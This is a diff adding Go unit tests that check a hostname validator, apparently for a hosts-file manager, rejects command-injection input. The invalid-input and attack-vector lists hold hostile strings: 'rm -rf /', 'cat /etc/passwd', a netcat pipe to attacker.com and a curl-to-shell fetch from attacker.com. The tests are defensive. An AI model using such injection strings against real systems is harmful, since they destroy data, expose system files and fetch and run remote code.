@@ -362,6 +362,102 @@ func TestRemoveExistingManagedBlock_PreservesOtherContent(t *testing.T) {
 	}
 }
 
+// Tests for hostname validation (command injection prevention)
+
+func TestValidateHostname_Valid(t *testing.T) {
+	validHostnames := []string{
+		"example.com",
+		"app.local",
+		"my-service.namespace.svc.cluster.local",
+		"a.b.c.d.e.f",
+		"123.456.789",
+		"test-123.example.com",
+		"UPPERCASE.local",
+		"MixedCase.Example.COM",
+		"a",
+		"a1",
+		"1a",
+	}
+	for _, h := range validHostnames {
+		if err := ValidateHostname(h); err != nil {
+			t.Errorf("ValidateHostname(%q) should be valid, got error: %v", h, err)
+		}
+	}
+}
+
+func TestValidateHostname_Invalid(t *testing.T) {
+	invalidHostnames := []string{
+		"",                           // empty
+		"foo\"; rm -rf / #",          // command injection
+		"foo$(whoami)",               // command substitution
+		"foo`id`",                    // backtick execution
+		"foo'bar",                    // single quote
+		"foo\"bar",                   // double quote
+		"foo;bar",                    // semicolon
+		"foo|bar",                    // pipe
+		"foo&bar",                    // ampersand
+		"foo>bar",                    // redirect
+		"foo<bar",                    // redirect
+		"foo bar",                    // space
+		"foo\tbar",                   // tab
+		"foo\nbar",                   // newline
+		"-startswithhyphen.com",      // starts with hyphen
+		".startwithdot.com",          // starts with dot
+		"endswithhyphen-.com",        // label ends with hyphen
+		string(make([]byte, 254)),    // too long (254 chars)
+	}
+	for _, h := range invalidHostnames {
+		if err := ValidateHostname(h); err == nil {
+			t.Errorf("ValidateHostname(%q) should be invalid, but was accepted", h)
+		}
+	}
+}
+
+func TestValidateHostname_CommandInjectionAttempts(t *testing.T) {
+	// These are the exact attack vectors we're preventing
+	attacks := []string{
+		`foo.bar"; rm -rf / #`,
+		`foo.bar$(whoami)`,
+		"foo.bar`id`",
+		`foo.bar'; cat /etc/passwd #`,
+		`foo.bar" && echo pwned`,
+		`foo.bar| nc attacker.com 1234`,
+		`foo.bar$(curl attacker.com/shell.sh|sh)`,
+		`127.0.0.1 localhost\n127.0.0.1 evil.com`,
+	}
+	for _, attack := range attacks {
+		if err := ValidateHostname(attack); err == nil {
+			t.Errorf("SECURITY: ValidateHostname should reject attack vector %q", attack)
+		}
+	}
+}
+
+func TestValidateEntries_Valid(t *testing.T) {
+	entries := []Entry{
+		{IP: "127.0.0.1", Hostname: "app1.local"},
+		{IP: "127.0.0.1", Hostname: "app2.example.com"},
+	}
+	if err := ValidateEntries(entries); err != nil {
+		t.Errorf("ValidateEntries should accept valid entries, got: %v", err)
+	}
+}
+
+func TestValidateEntries_Invalid(t *testing.T) {
+	entries := []Entry{
+		{IP: "127.0.0.1", Hostname: "valid.local"},
+		{IP: "127.0.0.1", Hostname: "invalid;hostname"},
+	}
+	if err := ValidateEntries(entries); err == nil {
+		t.Error("ValidateEntries should reject entries with invalid hostnames")
+	}
+}
+
+func TestValidateEntries_Empty(t *testing.T) {
+	if err := ValidateEntries([]Entry{}); err != nil {
+		t.Errorf("ValidateEntries should accept empty slice, got: %v", err)
+	}
+}
+
 // Helper function
 func contains(s, substr string) bool {
 	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsHelper(s, substr))
